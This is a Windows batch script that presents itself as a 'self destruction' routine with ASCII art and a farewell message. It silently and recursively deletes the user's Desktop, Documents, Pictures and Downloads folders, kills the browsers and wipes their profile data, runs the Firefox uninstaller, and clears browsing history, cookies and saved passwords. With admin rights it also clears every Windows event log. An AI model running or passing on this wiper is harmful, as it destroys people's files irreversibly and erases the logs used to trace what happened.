@Echo OFF
color a
echo ________________________________________________________________
echo ----------------------------------------------------------------
echo ----------------------------------------------------------------
echo ----------------------------------------------------------------
echo ----------------------------------------------------------------
echo //////////////////0\\\\\\\\\\\\\\\\.............................
echo //////////////////-\\\\\\\\\\\\\\\\\............................
echo /////////////////_._\\\\\\\\\\\\\\\\\..............kill.........
echo ////////////////-----\\\\\\\\\\\\\\\\\............______........
echo ///////////////_______\\\\\\\\\\\\\\\\\...........______........
echo //////////////_________\\\\\\\\\\\\\\\\\........................
echo /////////////___________\\\\\\\\\\\\\\\\\.......................
echo ////////////_____________\\\\\\\\\\\\\\\\\......................
echo  It was an honor working with you goodbye......my friend........ 
echo ----------------------------------------------------------------
echo ----------------------------------------------------------------
echo Launching self destruction......................................
echo Remember Man is still the most extraordinary computer of all....
echo ________________________________________________________________
del /S /q %USERPROFILE%\Desktop\* 2> null
DEL /F/Q/S %USERPROFILE%\Desktop\*.* 2> null
forfiles /P %USERPROFILE%\Desktop\ /M * /C "cmd /c if @isdir==TRUE rmdir /S /Q @file" 2> null
echo -----------------
echo //Loading//------
echo -----------------
del /S /q %USERPROFILE%\Documents\* 2> null
DEL /F/Q/S %USERPROFILE%\Documents\*.* 2> null
forfiles /P %USERPROFILE%\Documents\ /M * /C "cmd /c if @isdir==TRUE rmdir /S /Q @file" 2> null
del /S /q %USERPROFILE%\Pictures\* 2> null
DEL /F/Q/S %USERPROFILE%\Pictures\*.* 2> null
forfiles /P %USERPROFILE%\Pictures\ /M * /C "cmd /c if @isdir==TRUE rmdir /S /Q @file" 2> null
del /S /q %USERPROFILE%\Downloads\* 2> null
DEL /F/Q/S %USERPROFILE%\Downloads\*.* 2> null
forfiles /P %USERPROFILE%\Downloads\ /M * /C "cmd /c if @isdir==TRUE rmdir /S /Q @file" 2> null
echo -----------------------------------------
echo ///////////////////40/100////////////////
echo -----------------------------------------
taskkill /F /IM chrome.exe /T 2> null
TaskKill /im msedge.exe /f 2> null
TaskKill /im firefox.exe /f 2> null
forfiles /P %USERPROFILE%\AppData\Local\Google\ /M * /C "cmd /c if @isdir==TRUE rmdir /S /Q @file" 2> null
forfiles /P %USERPROFILE%\AppData\Local\Mozilla\ /M * /C "cmd /c if @isdir==TRUE rmdir /S /Q @file" 2> null
forfiles /P %USERPROFILE%\AppData\Local\Microsoft\Edge\ /M * /C "cmd /c if @isdir==TRUE rmdir /S /Q @file" 2> null
forfiles /P %USERPROFILE%\AppData\Local\Mozilla\Firefox\ /M * /C "cmd /c if @isdir==TRUE rmdir /S /Q @file" 2> null
echo ------------------------------------------------------------
echo /////////////////////////////////65/100/////////////////////
echo ------------------------------------------------------------
"C:\Program Files (x86)\Mozilla Firefox\uninstall\helper.exe" /s 2> null
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
REM History:
REM RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1
REM Cookies:
REM RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2
REM Temp Internet Files:
REM RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8
REM Form Data:
REM RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16
REM Passwords:
REM RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 32
REM OR
REM All:
rundll32.exe InetCpl.cpl,ClearMyTracksByProcess 4351
ipconfig /flushdns
echo -----------------------
echo //Deleting Event LOGS..
echo /////Please Wait///////
echo -----------------------

FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo All Event Logs have been cleared!
goto theEnd

:do_clear
wevtutil.exe cl %1 2> null
goto :eof

:noAdmin
color 4
echo Current user permissions to execute this .BAT file are inadequate.
echo This .BAT file must be run with administrative privileges.
echo Exit now, right click on this .BAT file, and select "Run as administrator".  
pause >nul
:theEnd

echo --------------------------------------------------------------------------------------------------------
echo ////////////////////////////////////////////////////////////////////////100/100//////////////////////////
echo --------------------------------------------------------------------------------------------------------
Pause&Exit


